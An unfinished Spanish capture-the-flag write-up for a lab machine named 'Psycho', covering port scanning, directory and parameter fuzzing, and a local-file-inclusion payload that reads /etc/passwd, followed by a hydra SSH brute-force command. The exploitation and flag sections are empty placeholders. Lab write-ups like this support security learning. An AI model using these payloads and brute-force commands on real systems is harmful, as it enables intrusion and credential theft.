# 🎯 Máquina: Psycho
**IP:** 172.17.0.2
**OS:** Linux (Docker)
**Dificultad:** Facil

---
## 1. 🔍 Enumeración
```bash
nmap -p- -sC -sV 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-08 16:50 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
|_  256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: 4You
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 5A:7A:3D:EF:5B:66 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Los servicios no parecen tener vulnerabilidades conocidas, procedemos a la inspección visual del http cargado en apache. Parece haber un nombre que se repite 'Luisillo'.
Debido a falta de pruebas procederemos a realizar un Fuzzing al objetivo:
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
assets       (Status: 301) [Size: 309] [--> http://172.17.0.2/assets/]
```
Revisamos la dirección en el navegador y nos lleva a un Index con una imagen `background.jpg` sospechoso. Procedemos a una revisión de la imagen, pero parece estar limpia.
En el `html` del sitio principal parece haber un error de código dinamico, lo que nos da a entender que hay un parametro en el backend que está soltando un error `[!] ERROR [!] `.
Probaremos hacer Fuzzing a un posible parametro oculto del .php:
```bash
ffuf -u http://172.17.0.2/index.php?FUZZ=test -w /usr/share/wordlists/dirb/common.txt -fs 2596    #2596 debido a que es el tamaño predeterminado de respuesta
secret   [Status: 200, Size: 2582, Words: 671, Lines: 63, Duration: 0ms]
```
Encontramos un parametro que está esperando una variable, al probarlo directo en la url:
`http://172.17.0.2/index.php?secret=test`
Notamos que no vuelve a saltar el error, dando por hecho que hay un posible LFI, probamos el siguiente link:
`http://172.17.0.2/index.php?secret=../../../../../../etc/passwd`
Entregando en el footer:
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:100:102::/nonexistent:/usr/sbin/nologin systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin vaxei:x:1001:1001:,,,:/home/vaxei:/bin/bash sshd:x:101:65534::/run/sshd:/usr/sbin/nologin luisillo:x:1002:1002::/home/luisillo:/bin/sh 
```
Encontrando los nombres de usuario: `luisillo | vaxei`, por lo que creamos un archivo con ambos usuarios para pasar a la fuerza bruta:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
Luego de un rato esperando no tuvimos éxito. Sabemos que tenemos [[]]
## 2. 🔓 Explotación (Foothold)
*(¿Cómo logramos entrar? ¿Qué vulnerabilidad o script usamos?)*


## 3. 🚀 Escalada de Privilegios
*(¿Cómo pasamos de ser un usuario normal a ser Administrador o Root?)*


## 4. 🚩 Banderas (Flags)
- **User:** 
- **Root**: 